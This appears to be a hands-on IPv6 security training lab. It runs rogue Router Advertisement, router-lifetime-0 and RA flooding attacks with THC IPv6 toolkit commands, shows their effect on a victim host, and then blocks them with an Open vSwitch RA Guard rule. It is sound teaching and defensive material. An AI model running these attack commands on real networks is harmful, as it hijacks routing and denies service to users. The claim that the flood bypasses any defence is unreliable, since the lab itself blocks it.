<style>
.command-block {
  background-color: #eaf3fb;
  padding: 6px;
  border-radius: 6px;
  font-family: 'Courier New', monospace;
  margin-top: 6px;
}
.note-block {
  background-color: #eaf3fb;
  padding: 6px 6px;
  border-radius: 6px;
  margin: 1rem 0;
}
.highlight {
  background-color: #fff3a3;
  padding: 0 2px;
  border-radius: 2px;
}
</style>

# IPv6 Security Lab Guide

---

- [Introduction](#introduction)
- [Objectives](#objectives)
- [Topology](#topology)
- [Device and IP Addressing Information](#device-and-ip-addressing-information)
- [Task 1](#task-1-verify-configuration-of-router-hosts-and-check-connectivity)
-- [Section 1.1](#section-11)
-- [Section 1.2](#section-12)
-- [Section 1.3](#section-13)
- [Task 2](#task-2-conduct-ipv6-ra-related-attacks)
-- [Attack 1](#attack-1-rogue-ra)
-- [Attack 2](#attack-2-router-lifetime-0-attack)
---

## Introduction

This lab is designed to help participants explore the security aspects of the IPv6 protocol and strengthen their practical understanding of secure IPv6 deployment. The lab begins with verifying basic IPv6 configuration and connectivity then moves into controlled demonstrations of IPv6 and ICMPv6 vulnerabilities using the THC IPv6 Attack Toolkit. Participants will observe how attacks such as rogue Router Advertisements (RAs), Neighbor Discovery (NDP) manipulation, and IPv6 reconnaissance affect a network.

The lab also covers key mitigation techniques, including the use of RA Guard to limit RA-based attacks and improve IPv6 network protection.

By completing this lab, participants will gain hands-on experience in identifying IPv6-specific threats, performing attack simulations, and applying security controls to protect IPv6 networks.

## Objectives

The lab will cover:

- Verify the initial configuration of router, hosts and check basic connectivity.
- Use the THC IPv6 Attack Toolkit to perform IPv6 Router Advertisement (RA)–based attacks and observe their impact.
- Deploy and test RA Guard to mitigate rogue RA attacks.
- Execute IPv6 Neighbor Discovery (NDP) attacks such as spoofing and cache poisoning.
- Perform IPv6 network reconnaissance to identify hosts, routers, and services on the network.

## Topology

<div align="center">
  <img src="topology.png" alt="IPv6 Lab Topology" width="600">
</div>

### Device and IP Addressing Information

| Device Name | Device Type | Interface | Description | IP Address |
|---|---|---|---|---|
| Router | Cisco CSR1000v | Gi1 | Connected to Switch | 2001:db8:0:100::1/64 |
| | | Lo0 | Loopback | 2001:db8::1/128 |
| Victim-Host | Ubuntu Linux | ens3 | Connected to Switch | Via SLAAC |
| Attacker-Host | Ubuntu Linux | ens3 | Connected to Switch | Via SLAAC |
| Switch (Open vSwitch) | Ubuntu Linux | ens3 | Connected to Router | N/A |
| | | ens4 | Connected to Victim-Host | N/A |
| | | ens5 | Connected to Attacker-Host | N/A |

#### Note down 
- IPv6 addresses are preconfigured on Router, Victim-Host and Attacker-Host.
- In Switch, all the dependencies related to `Open vSwitch` are already installed and required interfaces are added into the bridge.
- In Attacker-Host, the `THC IPv6 Attack Toolkit` is already installed.

For reference only:
<pre class="command-block">
apnic@attacker-host:~$ <b>sudo apt install -y build-essential libpcap-dev libssl-dev libnetfilter-queue-dev git</b>
apnic@attacker-host:~$ <b>cd /home/apnic/</b>
apnic@attacker-host:~$ <b>git clone https://github.com/vanhauser-thc/thc-ipv6.git</b>
apnic@attacker-host:~$ <b>cd thc-ipv6</b>
apnic@attacker-host:~$ <b>make</b>
apnic@attacker-host:~$ <b>sudo make install</b>
</pre>


---

## Task 1: Verify configuration of Router, Hosts and check connectivity

### Section 1.1

On **Router**, run `show ipv6 interface GigabitEthernet1` command to check the configured IPv6 address and multicast group address that Router has joined and also, it's RA capabilities.

<pre class="command-block">
Router# <b>show ipv6 interface GigabitEthernet1</b>
GigabitEthernet1 is up, line protocol is up
  IPv6 is enabled, link-local address is <span class="highlight">FE80::200:AFF:FEBC:1</span>
  No Virtual link-local address(es):
  Description: link to switch
  Global unicast address(es):
    2001:DB8:0:100::1, subnet is 2001:DB8:0:100::/64
  Joined group address(es):
    FF02::1
    FF02::2
    FF02::1:FF00:1
    FF02::1:FFBC:1
  MTU is 1500 bytes
  ICMP error messages limited to one every 100 milliseconds
  ICMP redirects are enabled
  ICMP unreachables are sent
  ND DAD is enabled, number of DAD attempts: 1
  ND reachable time is 30000 milliseconds (using 30000)
  ND advertised reachable time is 0 (unspecified)
  ND advertised retransmit interval is 0 (unspecified)
  ND router advertisements are sent every 200 seconds
  ND router advertisements live for 1800 seconds
  ND advertised default router preference is Medium
  Hosts use stateless autoconfig for addresses.
</pre>

On **Router**, run `show ipv6 route` command to check the routing table.

<pre class="command-block">
Router# show ipv6 route
LC  2001:DB8::1/128 [0/0]
     via Loopback0, receive
C   2001:DB8:0:100::/64 [0/0]
     via GigabitEthernet1, directly connected
L   2001:DB8:0:100::1/128 [0/0]
     via GigabitEthernet1, receive
<output omitted>
</pre>

On **Victim-Host**, run the following command to check interface status and configured GUA, LLA, MAC etc.

<pre class="command-block">
apnic@victim-host:~# <b>ifconfig ens3</b>
ens3: flags=4163 < UP,BROADCAST,RUNNING,MULTICAST >  mtu 1500
        inet6 fe80::5054:ff:fe73:806a  prefixlen 64  scopeid 0x20<link>
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 572  bytes 36116 (36.1 KB)
        RX errors 0  dropped 534  overruns 0  frame 0
        TX packets 65  bytes 6086 (6.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</pre>

On **Victim-Host**, run the following command to see the IPv6 routing table.

<pre class="command-block">
apnic@victim-host:~# <b>ip -6 route show</b>
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591830sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1630sec mtu 1500 hoplimit 64 pref medium
</pre>

On **Attacker-Host**, run the following command to check interface status and configured GUA, LLA, MAC etc.

<pre class="command-block">
apnic@attacker-host:~# <b>ip addr</b>
ens3: flags=4163 < UP,BROADCAST,RUNNING,MULTICAST >  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:3  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::5054:ff:fe98:a162  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:03  txqueuelen 1000  (Ethernet)
        RX packets 783  bytes 48842 (48.8 KB)
        RX errors 0  dropped 744  overruns 0  frame 0
        TX packets 69  bytes 6462 (6.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</pre>

On **Attacker-Host**, run the following command to see the IPv6 routing table.

<pre class="command-block">
apnic@attacker-host:~# <b>ip -6 route show</b>
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591879sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1679sec mtu 1500 hoplimit 64 pref medium
</pre>

### Section 1.2

On **Victim-Host**, ping the IPv6 address of Router's Loopback0 interface to verify connectivity.

<pre class="command-block">
apnic@victim-host:~# <b>ping 2001:db8::1 -c 3</b>
PING 2001:db8::1 (2001:db8::1) 56 data bytes
64 bytes from 2001:db8::1: icmp_seq=1 ttl=64 time=0.998 ms
64 bytes from 2001:db8::1: icmp_seq=2 ttl=64 time=1.18 ms
64 bytes from 2001:db8::1: icmp_seq=3 ttl=64 time=1.46 ms

--- 2001:db8::1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 0.998/1.214/1.462/0.190 ms
</pre>

On **Attacker-Host**, ping the IPv6 address of Router's Loopback0 interface to verify connectivity.

<pre class="command-block">
apnic@attacker-host:~# <b>ping 2001:db8::1 -c 3</b>
PING 2001:db8::1 (2001:db8::1) 56 data bytes
64 bytes from 2001:db8::1: icmp_seq=1 ttl=64 time=1.35 ms
64 bytes from 2001:db8::1: icmp_seq=2 ttl=64 time=1.63 ms
64 bytes from 2001:db8::1: icmp_seq=3 ttl=64 time=1.67 ms

--- 2001:db8::1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 1.354/1.552/1.674/0.141 ms
</pre>


### Section 1.3

On **Router**, run the following command to check neighbor table.

<pre class="command-block">
Router# <b>show ipv6 neighbors</b>
IPv6 Address                        Age Link-layer Addr State Interface
2001:DB8:0:100:200:AFF:FEBC:2         2 0000.0abc.0002  REACH Gi1
2001:DB8:0:100:200:AFF:FEBC:3         1 0000.0abc.0003  REACH Gi1
</pre>

On **Victim-Host**, run the following command to check neighbor table.

<pre class="command-block">
apnic@victim-host:~# <b>ip -6 neighbor show</b>
fe80::200:aff:febc:1 dev ens3 lladdr 00:00:0a:bc:00:01 router REACHABLE
2001:db8:0:100::1 dev ens3 lladdr 00:00:0a:bc:00:01 router REACHABLE
</pre>

On **Attacker-Host**, run the following command to check neighbor table.

<pre class="command-block">
apnic@attacker-host:~# <b>ip -6 neighbor show</b>
2001:db8:0:100::1 dev ens3 lladdr 00:00:0a:bc:00:01 router REACHABLE
fe80::200:aff:febc:1 dev ens3 lladdr 00:00:0a:bc:00:01 router REACHABLE
</pre>

On **Switch**, run the following command to check MAC address table.

<pre class="command-block">
apnic@switch:~# <b>sudo ovs-appctl fdb/show br0</b>
 port  VLAN  MAC                Age
    2     0  00:00:0a:bc:00:01   26
    3     0  00:00:0a:bc:00:03   25
    4     0  00:00:0a:bc:00:02   25
</pre>

---

## Task 2: Conduct IPv6 RA Related Attacks

### Attack 1: Rogue RA

#### Section 2.1

On **Attacker-Host**, run the following command to send Rogue RA to LAN.

<pre class="command-block">
apnic@attacker-host:~# <b>sudo fake_router26 -A 2001:db8:0:dead::/64 ens3</b>
Starting to advertise router (Press Control-C to end) ...
</pre>

On **Victim-Host**, run the following command to check its interface IP. Victim-Host should have computed new globally scoped IPv6 addresses using the rogue RA prefix. The old addresses will be listed too until lifetime expires.

<pre class="command-block">
apnic@victim-host:~# <b>ifconfig ens3</b>
ens3: flags=4163 < UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::5054:ff:fe73:806a  prefixlen 64  scopeid 0x20<link>
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 2001:db8:0:dead:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 1698  bytes 110556 (110.5 KB)
        RX errors 0  dropped 1540  overruns 0  frame 0
        TX packets 220  bytes 23048 (23.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</pre>

On **Victim-Host**, run the following command to check routing table. There are two next-hops displayed in the default route. One is from the Router, the other one is from the rogue RA. These two next-hops have the same weight, so traffic will be distributed evenly between the two next-hops (assuming both are reachable).

<pre class="command-block">
apnic@victim-host:~# <b>ip -6 route show</b>
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591827sec mtu 1500 hoplimit 64 pref medium
2001:db8:0:dead::/64 dev ens3 proto ra metric 512 expires 99994sec mtu 1500 hoplimit 255 pref high
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::5054:ff:fe98:a162 dev ens3 proto ra metric 512 expires 2043sec mtu 1500 hoplimit 255 pref high
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1627sec mtu 1500 hoplimit 64 pref medium
</pre>

On **Victim-Host**, try to ping Router's Loopback0 IP address. Ping should fail.

<pre class="command-block">
apnic@victim-host:~# <b>ping6 2001:db8::1 -c 3</b>
PING 2001:db8::1 (2001:db8::1) 56 data bytes

--- 2001:db8::1 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2075ms
</pre>

#### Section 2.2

On **Attacker-Host**, stop the attack by pressing Ctrl + C.

<pre class="command-block">
apnic@attacker-host:~# <b>sudo fake_router26 -A 2001:db8:0:dead::/64 ens3</b>
Starting to advertise router (Press Control-C to end) ...
^C
apnic@attacker-host:~#
</pre>

On **Victim-Host**, toggle the ens3 interface.

<pre class="command-block">
apnic@victim-host:~# <b>sudo ifconfig ens3 down</b>
apnic@victim-host:~# <b>sudo ifconfig ens3 up</b>
</pre>

On **Victim-Host**, recheck IP address. Now it should show normal output again.

<pre class="command-block">
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::200:aff:febc:2  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 2037  bytes 135072 (135.0 KB)
        RX errors 0  dropped 1807  overruns 0  frame 0
        TX packets 371  bytes 39490 (39.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</pre>

On **Victim-Host**, recheck routing table. Now it should show normal output again.

<pre class="command-block">
apnic@victim-host:~# ip -6 route show
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591888sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1688sec mtu 1500 hoplimit 64 pref medium
</pre>

On **Victim-Host**, try to ping Router's Loopback0 IP address. Now it should be pingable again.

<pre class="command-block">
apnic@victim-host:~# ping6 2001:db8::1 -c 3
PING 2001:db8::1 (2001:db8::1) 56 data bytes
64 bytes from 2001:db8::1: icmp_seq=1 ttl=64 time=1.43 ms
64 bytes from 2001:db8::1: icmp_seq=2 ttl=64 time=1.49 ms
64 bytes from 2001:db8::1: icmp_seq=3 ttl=64 time=1.55 ms

--- 2001:db8::1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 1.427/1.487/1.545/0.048 ms
</pre>

### Attack 2: Router Lifetime 0 Attack

#### Section 2.3

On **Attacker-Host**, run the following command to get the LLA and MAC address of Router.

**Attacker-Host**
```
apnic@attacker-host:~# ip -6 neighbor show
fe80::200:aff:febc:1 dev ens3 lladdr 00:00:0a:bc:00:01 router REACHABLE
```

On **Attacker-Host**, run the following command to send RA messages with a lifetime value of 0 using the router's LLA and MAC address.

**Attacker-Host**
```
apnic@attacker-host:~# sudo kill_router6 ens3 fe80::200:aff:febc:1 00:00:0a:bc:00:01
Starting to sending router kill entries for fe80::200:aff:febc:1 (Press Control-C to end) ...
RA kill packet to fe80::200:aff:febc:1 sent.
RA kill packet to fe80::200:aff:febc:1 sent.
RA kill packet to fe80::200:aff:febc:1 sent.
```

An RA message with a lifetime of 0 tells the host that this router (MAC: `00:00:0a:bc:00:01`) should no longer be used as the default gateway, and the host must remove the default route from its routing table.

On **Victim-Host**, (for quicker result) toggle the ens3 interface.

**Victim-Host**
```
apnic@victim-host:~# sudo ifconfig ens3 down
apnic@victim-host:~# sudo ifconfig ens3 up
```

On **Victim-Host**, check the routing table. Now there is no default route information displayed. After the Attacker-Host sends a forged RA with a Router Lifetime of 0 for the router `FE80::200:AFF:FEBC:1` (MAC `00:00:0A:BC:00:01`), the Victim-Host immediately removes its IPv6 default route. The default route is added back only when the Victim-Host receives the next legitimate Router Advertisement from the real router, which in our network occurs every 200 seconds.

**Victim-Host**
```
apnic@victim-host:~# ip -6 route show
fe80::/64 dev ens3 proto kernel metric 256 pref medium
```

#### Section 2.4

On **Attacker-Host**, stop attack by pressing Ctrl + C.

**Attacker-Host**
```
apnic@attacker-host:~# sudo kill_router6 ens3 fe80::200:aff:febc:1 00:00:0a:bc:00:01
RA kill packet to fe80::200:aff:febc:1 sent.
RA kill packet to fe80::200:aff:febc:1 sent.
RA kill packet to fe80::200:aff:febc:1 sent.
^C
apnic@attacker-host:~#
```

On **Victim-Host**, toggle the ens3 interface.

**Victim-Host**
```
apnic@victim-host:~# sudo ifconfig ens3 down
apnic@victim-host:~# sudo ifconfig ens3 up
```

On **Victim-Host**, recheck IP address. Now it should show normal output again.

**Victim-Host**
```
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::200:aff:febc:2  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 2037  bytes 135072 (135.0 KB)
        RX errors 0  dropped 1807  overruns 0  frame 0
        TX packets 371  bytes 39490 (39.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

On **Victim-Host**, recheck routing table. Now it should show normal output again.

**Victim-Host**
```
apnic@victim-host:~# ip -6 route show
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591888sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1688sec mtu 1500 hoplimit 64 pref medium
```

On **Victim-Host**, try to ping Router's Loopback0 IP address. Now it should be pingable again.

**Victim-Host**
```
apnic@victim-host:~# ping6 2001:db8::1 -c 3
PING 2001:db8::1 (2001:db8::1) 56 data bytes
64 bytes from 2001:db8::1: icmp_seq=1 ttl=64 time=1.43 ms
64 bytes from 2001:db8::1: icmp_seq=2 ttl=64 time=1.49 ms
64 bytes from 2001:db8::1: icmp_seq=3 ttl=64 time=1.55 ms

--- 2001:db8::1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 1.427/1.487/1.545/0.048 ms
```

### Attack 3: RA Flooding Attack (Overwhelm Nodes)

#### Section 2.5

On **Attacker-Host**, run the following command to send multiple fake RA messages in the LAN.

**Attacker-Host**
```
apnic@attacker-host:~# sudo flood_router26 ens3 & PID=$! && sleep 1 && sudo kill $PID
[1] 1514
Starting to flood network with router advertisements on ens3 (Press Control-C to end, a dot is printed for every 1000 packets):
............
```

As this sends 1000 packets per second, it could very quickly overwhelm the Victim-Host. The above command will run the attack for 1 second. This attack also has extension header options which can bypass any defence.

On **Victim-Host**, run the following command to check the result.

**Victim-Host**
```
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2012:1f2b:453c:e122:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 2012:1f2a:113b:e122:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 2012:1f39:cd36:e122:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 2012:1f30:8b33:e122:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 2012:1f38:6932:e122:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 2012:1f2a:ed2b:e122:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 2012:1f3e:e32a:e122:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 2012:1f38:1124:e122:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        .
        .
        .
```

On **Victim-Host**, run the following command to check the routing table.

**Victim-Host**
```
apnic@victim-host:~# ip -6 route show
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591927sec mtu 1500 hoplimit 64 pref medium
2004:1f40:e:e722::/64 via fe80::1f:26fe:de7:2201 dev ens3 proto ra metric 512 expires 130523sec mtu 1500 hoplimit 255 pref high
2004:1f40:11:e422::/64 via fe80::1f:26fe:10e4:2201 dev ens3 proto ra metric 512 expires 130520sec mtu 1500 hoplimit 255 pref high
2004:1f40:13:e222::/64 via fe80::1f:26fe:12e2:2201 dev ens3 proto ra metric 512 expires 130517sec mtu 1500 hoplimit 255 pref high
2004:1f40:42:e622::/64 via fe80::1f:26fe:41e6:2201 dev ens3 proto ra metric 512 expires 130521sec mtu 1500 hoplimit 255 pref high
2004:1f40:44:e422::/64 via fe80::1f:26fe:43e4:2201 dev ens3 proto ra metric 512 expires 130520sec mtu 1500 hoplimit 255 pref high
2004:1f40:45:e322::/64 via fe80::1f:26fe:44e3:2201 dev ens3 proto ra metric 512 expires 130519sec mtu 1500 hoplimit 255 pref high
2004:1f40:46:e222::/64 via fe80::1f:26fe:45e2:2201 dev ens3 proto ra metric 512 expires 130518sec mtu 1500 hoplimit 255 pref high
.
.
.
```

Each Router Advertisement (RA) will cause a new route to be added to the routing table. This attack can exhaust the victim's CPU, since each Router Advertisement triggers costly processing and forces the system to compute new IPv6 addresses from the advertised prefixes.

#### Section 2.6

On **Attacker-Host**, stop attack by pressing Ctrl + C.

**Attacker-Host**
```
apnic@attacker-host:~# sudo flood_router26 ens3 & PID=$! && sleep 1 && sudo kill $PID
[1] 1514
Starting to flood network with router advertisements on ens3 (Press Control-C to end, a dot is printed for every 1000 packets):
............^C
apnic@attacker-host:~#
```

On **Victim-Host**, run the following command to reboot the machine.

**Victim-Host**
```
apnic@victim-host:~# sudo reboot
```

---

## Task 3: Configure RA Guard on Switch

### Defence 1: Defence against Rogue RA Attack

#### Section 3.1

On **Switch**, run the following command to configure RA filtering.

**Switch**
```
apnic@switch:~# sudo ovs-ofctl add-flow br0 \
"priority=10,icmp6,in_port=ens5,icmp_type=134,actions=drop"
```

As we are using Open vSwitch in this lab, there is no in-built RA guard, so we must make a filter for this. What we are requesting here is on `ens5` of our switch (this is the port our Attacker-Host is connected to), drop any packets that match ICMPv6 and icmp type 134 (Router Advertisement).

On **Switch**, run the following command to monitor and make sure the attacking packets are matching the filter. It will check current flow.

**Switch**
```
apnic@switch:~# watch -c 'sudo ovs-ofctl dump-flows br0'
NXST_FLOW reply (xid=0x4):
 cookie=0x0, duration=130.064s, table=0, n_packets=0, n_bytes=0, idle_age=130,
priority=10,icmp6,in_port=3,icmp_type=134 actions=drop
 cookie=0x0, duration=437.866s, table=0, n_packets=1015, n_bytes=64660,
idle_age=1, priority=0 actions=NORMAL
```

#### Section 3.2

On **Attacker-Host**, run the following command to check Defence 1 – against Rogue RA.

**Attacker-Host**
```
apnic@attacker-host:~# sudo fake_router26 -A 2001:db8:0:dead::/64 ens3
Starting to advertise router (Press Control-C to end) ...
```

On **Switch**, run the following command to monitor to make sure the attacking packets are matching the filter. It will check current flow. We should see the packets and bytes increasing on the newly created filter.

**Switch**
```
apnic@switch:~# watch -c 'sudo ovs-ofctl dump-flows br0'
cookie=0x0, duration=76.266s, table=0, n_packets=8, n_bytes=944, idle_age=1, pr
iority=10,icmp6,in_port=3,icmp_type=134 actions=drop
 cookie=0x0, duration=1086.061s, table=0, n_packets=2887, n_bytes=214277, idle_a
ge=1, priority=0 actions=NORMAL
```

On **Victim-Host**, run the following command to check its interface IP. We can see only one GUA even though the attack is going on.

**Victim-Host**
```
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::200:aff:febc:2  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 796  bytes 60606 (60.6 KB)
        RX errors 0  dropped 560  overruns 0  frame 0
        TX packets 314  bytes 32132 (32.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

On **Victim-Host**, run the following command to check its routing table. We can see only one default route even though the attack is going on. Additionally, you can also ping the loopback IP of Router to check reachability.

**Victim-Host**
```
apnic@victim-host:~# ip -6 route show
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591994sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1794sec mtu 1500 hoplimit 64 pref medium
```

#### Section 3.3

On **Attacker-Host**, stop attack by pressing Ctrl + C.

**Attacker-Host**
```
apnic@attacker-host:~# sudo fake_router26 -A 2001:db8:0:dead::/64 ens3
Starting to advertise router (Press Control-C to end) ...
^C
apnic@attacker-host:~#
```

### Defence 2: Defence against Router Lifetime 0 Attack

#### Section 3.4

On **Attacker-Host**, run the following command to send RA messages with a lifetime value of 0 using the router's details.

**Attacker-Host**
```
apnic@attacker-host:~# sudo kill_router6 ens3 fe80::200:aff:febc:1 00:00:0a:bc:00:01
Starting to sending router kill entries for fe80::200:aff:febc:1 (Press Control-C to end) ...
RA kill packet to fe80::200:aff:febc:1 sent.
RA kill packet to fe80::200:aff:febc:1 sent.
RA kill packet to fe80::200:aff:febc:1 sent.
```

Since RA Guard is enabled on the Switch, we should see the packet count increasing as the switch drops the rogue RA packets being initiated by the Attacker-Host (with spoofed link-local) on interface ens3. Even though the Attacker-Host spoofs the source of the RA with Router's LLA and MAC address, our filter drops rogue RA packets since it was received on a non-router port `ens5`.

On **Switch**, run the following command to monitor to make sure the attacking packets are matching the filter. It will check current flow.

**Switch**
```
apnic@switch:~# watch -c 'sudo ovs-ofctl dump-flows br0'
NXST_FLOW reply (xid=0x4):
 cookie=0x0, duration=836.146s, table=0, n_packets=58, n_bytes=5356, idle_age=1,
 priority=10,icmp6,in_port=3,icmp_type=134 actions=drop
 cookie=0x0, duration=2761.524s, table=0, n_packets=6379, n_bytes=428733, idle_a
ge=1, priority=0 actions=NORMAL
```

On **Victim-Host**, run the following command to check its interface IP. We can see only one GUA even though the attack is going on. Additionally, you can also ping the loopback IP of Router to check reachability.

**Victim-Host**
```
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::200:aff:febc:2  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 796  bytes 60606 (60.6 KB)
        RX errors 0  dropped 560  overruns 0  frame 0
        TX packets 314  bytes 32132 (32.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

On **Victim-Host**, run the following command to check its routing table. We can see only one default route even though the attack is going on.

**Victim-Host**
```
apnic@victim-host:~# ip -6 route show
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591994sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1794sec mtu 1500 hoplimit 64 pref medium
```

#### Section 3.5

On **Attacker-Host**, stop attack by pressing Ctrl + C.

**Attacker-Host**
```
apnic@attacker-host:~# sudo kill_router6 ens3 fe80::200:aff:febc:1 00:00:0a:bc:00:01
Starting to sending router kill entries for fe80::200:aff:febc:1 (Press Control-C to end) ...
RA kill packet to fe80::200:aff:febc:1 sent.
RA kill packet to fe80::200:aff:febc:1 sent.
RA kill packet to fe80::200:aff:febc:1 sent.
^C
apnic@Attacker-Host:~$
```

### Defence 3: Defence against RA Flood Attack

#### Section 3.6

On **Attacker-Host**, run the following command to send multiple fake RA messages in the LAN.

**Attacker-Host**
```
apnic@attacker-host:~# sudo flood_router26 ens3 & PID=$! && sleep 1 && sudo kill $PID
Starting to flood network with router advertisements on ens3 (Press Control-C to end, a dot is printed for every 1000 packets):
...............
apnic@Attacker-Host:~$
```

On **Switch**, run the following command to monitor to make sure the attacking packets are matching the filter. It will check current flow. We should see the packets and bytes increasing on the newly created filter.

**Switch**
```
apnic@switch:~# watch -c 'sudo ovs-ofctl dump-flows br0'
NXST_FLOW reply (xid=0x4):
 cookie=0x0, duration=1368.797s, table=0, n_packets=7754, n_bytes=11343908, idle
_age=96, priority=10,icmp6,in_port=3,icmp_type=134 actions=drop
 cookie=0x0, duration=3294.175s, table=0, n_packets=9285, n_bytes=2387606, idle_
age=1, priority=0 actions=NORMAL
```

On **Victim-Host**, run the following command to check its interface IP. We can see only one GUA even though the attack is going on.

**Victim-Host**
```
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::200:aff:febc:2  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 796  bytes 60606 (60.6 KB)
        RX errors 0  dropped 560  overruns 0  frame 0
        TX packets 314  bytes 32132 (32.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

On **Victim-Host**, run the following command to check its routing table. We can see only one default route even though the attack is going on.

**Victim-Host**
```
apnic@victim-host:~# ip -6 route show
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591994sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1794sec mtu 1500 hoplimit 64 pref medium
```

#### Section 3.7

On **Attacker-Host**, stop attack by pressing Ctrl + C.

**Attacker-Host**
```
apnic@attacker-host:~# sudo flood_router26 ens3 & PID=$! && sleep 1 && sudo kill $PID
Starting to flood network with router advertisements on ens3 (Press Control-C to end, a dot is printed for every 1000 packets):
...............
^C
apnic@Attacker-Host:~$
```

**(Optional)** On **Switch**, run the following command to delete the configured flow.

**Switch**
```
apnic@switch:~# sudo ovs-ofctl del-flows br0 "icmp6,in_port=ens5,icmp_type=134"

## OR TO DELETE ALL CONFIGURED RULES ##
apnic@switch:~# sudo ovs-ofctl del-flows br0
```

On **Switch**, run the following command to see the changes. Now we can see the drop rule is deleted.

**Switch**
```
apnic@switch:~# sudo ovs-ofctl dump-flows br0
NXST_FLOW reply (xid=0x4):
 cookie=0x0, duration=3613.851s, table=0, n_packets=9935, n_bytes=2426962, idle_
age=1, priority=0 actions=NORMAL
```

---
